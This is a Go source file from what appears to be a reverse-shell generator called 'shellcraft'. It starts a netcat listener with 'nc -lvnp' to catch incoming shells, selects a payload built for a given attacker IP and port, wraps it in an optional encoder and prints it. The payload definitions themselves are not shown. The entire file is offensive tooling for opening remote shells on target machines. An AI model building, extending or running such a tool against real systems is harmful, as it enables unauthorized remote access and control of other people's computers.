package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func handleListen(args []string) {
	if len(args) < 1 {
		fmt.Println("[!] Usage: shellcraft listen <port>")
		return
	}
	port := args[0]
	fmt.Printf("[*] Starting netcat listener on port %s...\n", port)
	cmd := exec.Command("nc", "-lvnp", port)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	if err := cmd.Run(); err != nil {
		fmt.Printf("[!] Error running netcat: %v\n", err)
		fmt.Println("[*] Make sure 'nc' is installed on your system.")
	}
}

func handleNonInteractive(ip string, port int, pType string, enc string) {
	payloads := GeneratePayloads(ip, port)
	var selectedPayload *Payload
	
	pType = strings.ToLower(pType)
	for _, p := range payloads {
		if strings.Contains(strings.ToLower(p.Name), pType) {
			selectedPayload = &p
			break
		}
	}

	if selectedPayload == nil {
		fmt.Printf("[!] Unknown payload type: %s\n", pType)
		return
	}

	encoders := GetEncoders()
	var selectedEncoder *Encoder
	enc = strings.ToLower(enc)
	for _, e := range encoders {
		if strings.Contains(strings.ToLower(e.Name), enc) {
			selectedEncoder = &e
			break
		}
	}

	if selectedEncoder == nil {
		selectedEncoder = &encoders[0] // Default to Raw
	}

	finalPayload := selectedEncoder.Wrap(selectedPayload.Code)
	fmt.Println(finalPayload)
}
